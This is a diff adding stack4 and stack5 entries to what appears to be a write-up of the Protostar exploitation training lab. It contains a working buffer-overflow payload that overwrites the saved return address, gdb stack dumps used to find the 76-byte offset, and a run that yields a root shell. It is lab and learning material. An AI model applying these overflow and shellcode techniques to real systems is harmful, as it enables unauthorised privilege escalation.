@@ -248,3 +248,60 @@ code flow successfully changed
 
 - Because `buffer` is 64 bytes long, each subsequent character will spill into next variable in the stack.
 - That variable happens to be `fp`, which I need to change to point to `win` function.
+
+## stack4
+
+- This is how I've crafted my exploit in `python2`:
+
+```sh
+$ python -c 'payload=b""; payload+=b"\x00"*76; payload+=b"\xf7\x83\x04\x08"; print(payload)' > /dev/shm/i
+$ cd /opt/protostar/bin
+$ cat /dev/shm/i | ./stack4
+code flow successfully changed
+Segmentation fault
+```
+
+- At first I thought I needed padding of 64 bytes, but I was wrong.
+- I was able to find the correct padding using `gdb`:
+
+```sh
+(gdb) i f
+Stack level 0, frame at 0xbffffcc0:
+ eip = 0x804841d in main (stack4/stack4.c:16); saved eip 0xb7eadc76
+ source language c.
+ Arglist at 0xbffffcb8, args: argc=1, argv=0xbffffd64
+ Locals at 0xbffffcb8, Previous frame's sp is 0xbffffcc0
+ Saved registers:
+  ebp at 0xbffffcb8, eip at 0xbffffcbc
+(gdb) x/40wx $esp
+0xbffffc60:     0xbffffc70      0xb7ec6165      0xbffffc78      0xb7eada75
+0xbffffc70:     0x41414141      0x41414141      0x41414141      0x41414141
+0xbffffc80:     0x41414141      0x41414141      0x41414141      0x41414141
+0xbffffc90:     0x41414141      0x41414141      0x41414141      0x41414141
+0xbffffca0:     0x41414141      0x41414141      0x41414141      0x41414141
+0xbffffcb0:     0x41414141      0x080483f7      0xbffffd00      0xb7eadc76
+0xbffffcc0:     0x00000001      0xbffffd64      0xbffffd6c      0xb7fe1848
+0xbffffcd0:     0xbffffd20      0xffffffff      0xb7ffeff4      0x0804824b
+0xbffffce0:     0x00000001      0xbffffd20      0xb7ff0626      0xb7fffab0
+0xbffffcf0:     0xb7fe1b28      0xb7fd7ff4      0x00000000      0x00000000
+```
+
+- `saved eip 0xb7eadc76` is at offset of 76 bytes from the start of our target buffer.
+
+## stack5
+
+- Exploit `stack5` like this:
+
+```sh
+$ (python /tmp/e.py ; cat) | /opt/protostar/bin/stack5
+id
+uid=1001(user) gid=1001(user) euid=0(root) groups=0(root),1001(user)
+whoami
+root
+```
+
+- `cat` is added so that you can specify your input in the shell, so that `/bin/sh` doesn't exit immediately.
+- Sources:
+1. https://www.youtube.com/watch?v=HSlhY4Uy8SA
+2. http://www.shell-storm.org/shellcode/files/shellcode-811.html
+
